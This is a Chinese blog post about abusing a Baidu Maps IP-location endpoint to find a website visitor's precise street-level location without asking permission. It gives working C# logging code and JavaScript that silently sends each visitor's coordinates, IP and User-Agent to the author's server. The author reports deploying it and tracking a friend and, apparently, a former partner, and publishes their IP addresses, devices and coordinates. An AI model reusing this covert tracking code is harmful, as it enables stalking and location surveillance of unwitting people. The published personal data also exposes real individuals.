---
title: 基于百度定位接口的 Hacker 行为
date: 2020-12-08 21:40:00
tags: [baidu,location]
categories: Blog
---
<img src="https://sadness96.github.io/images/blog/blog-Location/LocationLogo.jpg"/>

<!-- more -->
### 声明
* 该文章编写于 2020 年 12 月 8 日，仅用于自己调试使用，接下来会向百度北京百度网讯科技有限公司提交工单报告问题，确保接口完全失效或加密传输等变更后才会发布该文章。
* 或许有人并不在意自己的位置信息，也不知道这意味着什么，但是我依旧认为这是最重要的隐私之一。
* 涉及到 WEB 定位，无需位置权限，无需安装特定软件。

### 简介
在一次对接百度地图 SDK 时发现文档中对定位仅提供了移动端的精确定位，但是 [JavaScript API](http://lbsyun.baidu.com/index.php?title=jspopularGL) 中提供的 API 定位仅能定位到城市，但是网页打开的百度地图却能定位到相当准确的位置。

#### 接口介绍
##### 获取接口
在分析百度地图的所有请求后找到了精确定位的接口

``` JavaScript
"https://map.baidu.com/?qt=ipLocation&t=" + (new Date).getTime()
```

##### 接口弊端
对这个接口反复测试过几次做出以下结论：
1. 仅能通过浏览器访问才能正确返回，Postman 与应用程序调用访问似乎会屏蔽所需的必要参数。
1. 精准定位需连接本地宽带，4G/5G 信号仅能定位到市级。
1. 移动端访问仅能使用非 Chrome 浏览器(猜测 Chrome 浏览器安全性过高，会屏蔽所需必要参数)。
1. 猜测百度应该是存在一个自己的 IP 地址库，但是由于国内运营商采用动态分配 IP 的方式，所以可能存在一定误差，概率不大，但是误差的时候也在几公里范围。
1. 接口仅能提供查询者的地址，并不能查询其他 IP 的地址，虽然限制很多，但是这足够做很多事情了。

##### 调用接口
网页地址栏输入(不需要赋予定位权限)：
https://map.baidu.com/?qt=ipLocation&t=1607523200651

返回数据：

``` json
{
    "ipLoc":{
        "content":{
            "location":{
                "lat":4840899,
                "lng":12966648
            },
            "locid":"1cfeaa7df6781bcdbe41f7b49e6c5bf7",
            "radius":31,
            "confidence":1,
            "ip_type":0,
            "point":{
                "x":12966648,
                "y":4840899
            }
        },
        "result":{
            "error":161,
            "loc_time":"2020-12-08 22:17:45"
        },
        "status":"success",
        "message":"request hpiploc server[iploc] success",
        "code":0,
        "time":25
    },
    "rgc":{
        "status":"success",
        "result":{
            "location":{
                "lng":116.48011342363,
                "lat":40.018513771427
            },
            "formatted_address":"北京市朝阳区利泽中二路3号",
            "business":"望京",
            "addressComponent":{
                "country":"中国",
                "country_code":0,
                "country_code_iso":"CHN",
                "country_code_iso2":"CN",
                "province":"北京市",
                "city":"北京市",
                "city_level":2,
                "district":"朝阳区",
                "town":"",
                "town_code":"",
                "adcode":"110105",
                "street":"利泽中二路",
                "street_number":"3号",
                "direction":"东南",
                "distance":"74"
            },
            "pois":[
                {
                    "addr":"北京市朝阳区利泽中二路利泽中园108",
                    "cp":"",
                    "direction":"内",
                    "distance":"0",
                    "name":"望京科技园-E座",
                    "poiType":"房地产",
                    "point":{
                        "x":116.48030206778,
                        "y":40.018396351472
                    },
                    "tag":"房地产",
                    "tel":"",
                    "uid":"5788729a4e43ccce4d2fdf8e",
                    "zip":"",
                    "parent_poi":{
                        "name":"",
                        "tag":"",
                        "addr":"",
                        "point":{
                            "x":0,
                            "y":0
                        },
                        "direction":"",
                        "distance":"",
                        "uid":""
                    }
                }
            ],
            "roads":[

            ],
            "poiRegions":[
                {
                    "direction_desc":"内",
                    "name":"望京科技园-E座",
                    "tag":"房地产;写字楼",
                    "uid":"5788729a4e43ccce4d2fdf8e",
                    "distance":"0"
                },
                {
                    "direction_desc":"内",
                    "name":"望京科技园",
                    "tag":"公司企业;园区",
                    "uid":"9619ece5dbbdbe6bf90cad46",
                    "distance":"0"
                }
            ],
            "sematic_description":"望京科技园内,朝阳区望京产业开发区附近45米",
            "cityCode":131
        },
        "code":0,
        "message":"request geocoder/v2 success",
        "time":7
    }
}
```

其中 rgc.result.location 包含精准经纬度数据(百度地图坐标系偏移)，使用百度地图 api 中提供的经纬度定位，可获得以下内容，没有错，我就在这里！
<img src="https://sadness96.github.io/images/blog/blog-Location/location1.jpg"/>

##### 使用这个接口做些什么
首先我在服务端创建了一个接收接口，同时获取访问者 IP 地址、User-Agent 信息、经纬度信息。
接口会对信息进行缓存，相同访问者 10 分钟仅会记录一次。

``` CSharp
/// <summary>
/// 请求保存的百度经纬度数据缓存
/// </summary>
private static Dictionary<string, DateTime> TempBaiduLocation { get; set; }

/// <summary>
/// 保存地址数据
/// </summary>
/// <param name="lng">经度</param>
/// <param name="lat">纬度</param>
[HttpGet]
public void SaveLocationInfo(double lng, double lat)
{
    if (TempBaiduLocation == null)
    {
        TempBaiduLocation = new Dictionary<string, DateTime>();
    }
    var vIpAddress = Request.HttpContext.Connection.RemoteIpAddress?.ToString();
    var vUserAgent = Request.Headers["User-Agent"];
    if (!string.IsNullOrEmpty(vIpAddress) && !string.IsNullOrEmpty(vUserAgent) &&
        !double.IsNaN(lng) && lng >= 1 && !double.IsNaN(lat) && lat >= 1)
    {
        if (TempBaiduLocation.ContainsKey(vIpAddress) && DateTime.Now - TempBaiduLocation[vIpAddress] <= new TimeSpan(TimeSpan.TicksPerMinute * 10))
        {
            return;
        }
        if (TempBaiduLocation.ContainsKey(vIpAddress))
        {
            TempBaiduLocation[vIpAddress] = DateTime.Now;
        }
        else
        {
            TempBaiduLocation.Add(vIpAddress, DateTime.Now);
        }
        NLogHelper.SaveInfo($"ip:{vIpAddress},ua:{vUserAgent},lng:{lng},lat:{lat}");
    }
}
```

部署服务到公网服务器中，然后通过跨域请求传递信息到服务器中。
编写获取经纬度以及请求部分，方法会每隔两秒请求一次经纬度信息，直至请求到数据后发送到指定的位置，这样就可以获取到所有想要的信息了。

``` JavaScript
function GetIpLocation() {
    $.get({
        url: "https://map.baidu.com/?qt=ipLocation&t=" + (new Date).getTime(),
        dataType: "jsonp",
        success: function (obj) {
            if (obj && obj.rgc != null) {
                var vBaiduLng = obj.rgc.result.location.lng;
                var vBaiduLat = obj.rgc.result.location.lat;
                if (vBaiduLng != null && vBaiduLng != undefined && vBaiduLng != "" && vBaiduLng >= 1 &&
                    vBaiduLat != null && vBaiduLat != undefined && vBaiduLat != "" && vBaiduLat >= 1) {
                    var vBaseUrl = "https://api.liujiahua.com(例)";
                    var vApiUrl = "//api/BaiduApi/SaveLocationInfo";
                    var vDataUrl = "?lng=" + vBaiduLng + "&lat=" + vBaiduLat;
                    $.get({
                        url: vBaseUrl + vApiUrl + vDataUrl,
                        dataType: "jsonp",
                        success: function (obj) {
                        }
                    })
                }
            } else {
                setTimeout(function () {
                    GetIpLocation();
                }, 2000);
            }
        }
    })
}
```

##### 成果
编写完以上这些并不麻烦，充满了自己想要的期待，但是万万没想到上线一周就得到了自己想要的结果。
* 在第一次收到数据就定位到了熟悉的地址，好朋友，这是你没错了。深圳的 IP 地址，Chrome 浏览器，定位在你们公司楼里。

``` text
2020-11-30 13:46:24.611 ip:119.137.54.255,ua:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36,lng:113.94579593804,lat:22.530203078664
```

<img src="https://sadness96.github.io/images/blog/blog-Location/location2.jpg"/>

* 另外一个我期望的信息，没想到来的这么快，知道我的域名，同时使用 努比亚X 这么小众的手机，QQ 浏览器，并且在哈尔滨，我知道这肯定就是你，这一世咱们缘分薄，知道你过得还不错，我这心也就踏实了，愿一切安好。

``` text
2020-12-03 19:44:36.083 ip:1.58.90.177,ua:Mozilla/5.0 (Linux; U; Android 9; zh-cn; NX616J Build/PKQ1.180929.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.3865.120 MQQBrowser/11.0 Mobile Safari/537.36 COVC/045429,lng:126.70117723534,lat:45.785759977106
```

<img src="https://sadness96.github.io/images/blog/blog-Location/location3.jpg"/>